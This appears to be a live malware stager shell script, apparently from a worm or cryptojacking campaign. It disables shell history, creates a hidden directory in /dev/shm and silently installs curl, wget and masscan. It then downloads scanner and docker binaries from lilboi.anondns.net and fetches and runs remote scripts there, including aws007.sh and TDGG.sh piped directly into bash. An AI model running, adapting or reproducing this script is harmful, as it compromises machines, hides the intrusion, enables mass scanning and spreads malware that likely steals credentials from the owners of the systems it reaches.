#!/bin/bash
unset HISTFILE
export HOME=/root
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games
export SCAN_RATE=500000

if ! [ -d "/dev/shm/.../...lilboi.../" ] ; then mkdir -p /dev/shm/.../...lilboi.../ ; fi
if ! type curl 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y curl 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y curl 2>/dev/null 1>/dev/null ; yum reinstall -y curl 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add curl 2>/dev/null 1>/dev/null ; fi
fi
if ! type wget 2>/dev/null 1>/dev/null; then if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null ; apt-get install -y wget 2>/dev/null 1>/dev/null ; apt-get install -y --reinstall wget 2>/dev/null 1>/dev/null ; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null ; yum install -y wget 2>/dev/null 1>/dev/null ; yum reinstall -y wget 2>/dev/null 1>/dev/null ; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null ; apk add wget 2>/dev/null 1>/dev/null ; fi
fi
if ! type bash 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y bash 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y bash 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add bash 2>/dev/null 1>/dev/null; fi
fi
if ! [ -f "/usr/sbin/zgrab" ] ; then curl -sLk -o /usr/sbin/zgrab http://lilboi.anondns.net/outgoing/binary_files/scanner/zgrab ; chmod +x /usr/sbin/zgrab ; fi
if ! [ -f "/usr/sbin/jq" ] ; then curl -sLk -o /usr/sbin/jq http://lilboi.anondns.net/outgoing/binary_files/system/jq ; chmod +x /usr/sbin/jq ; fi
if ! type masscan 2>/dev/null 1>/dev/null; then 
if type apt-get 2>/dev/null 1>/dev/null; then wget http://archive.ubuntu.com/ubuntu/pool/main/libp/libpcap/libpcap0.8_1.7.4-2_amd64.deb ; dpkg -i libpcap0.8_1.7.4-2_amd64.deb ; rm -f libpcap0.8_1.7.4-2_amd64.deb ; wget http://archive.ubuntu.com/ubuntu/pool/universe/m/masscan/masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; dpkg -i masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; rm -f masscan_1.0.3-95-gb395f18~ds0-2_amd64.deb ; fi
if type yum 2>/dev/null 1>/dev/null; then wget http://mirror.centos.org/centos/7/os/x86_64/Packages/libpcap-1.5.3-12.el7.x86_64.rpm ; rpm -Uvh libpcap-1.5.3-12.el7.x86_64.rpm ; rm -f libpcap-1.5.3-12.el7.x86_64.rpm ; wget https://download-ib01.fedoraproject.org/pub/epel/7/x86_64/Packages/m/masscan-1.0.3-5.el7.x86_64.rpm ; rpm -Uvh masscan-1.0.3-5.el7.x86_64.rpm ; rm -f masscan-1.0.3-5.el7.x86_64.rpm ; fi
fi
if ! type docker 2>/dev/null 1>/dev/null ; then 
#curl -Lk https://get.docker.com | bash ; 
curl -Lk http://lilboi.anondns.net/outgoing/binary_files/system/docker -o /usr/bin/docker ; chmod +x /usr/bin/docker
fi
if ! [ -f "/tmp/aws007.sh" ] ; then
if type wget 2>/dev/null 1>/dev/null ; then wget http://lilboi.anondns.net/pwn/aws007.sh -O /tmp/aws007.sh ; chmod +x /tmp/aws007.sh ; /tmp/aws007.sh ; fi
if type curl 2>/dev/null 1>/dev/null ; then curl http://lilboi.anondns.net/pwn/aws007.sh -o /tmp/aws007.sh ; chmod +x /tmp/aws007.sh ; /tmp/aws007.sh ; fi
fi


curl http://lilboi.anondns.net/pwn/TDGG.sh | bash


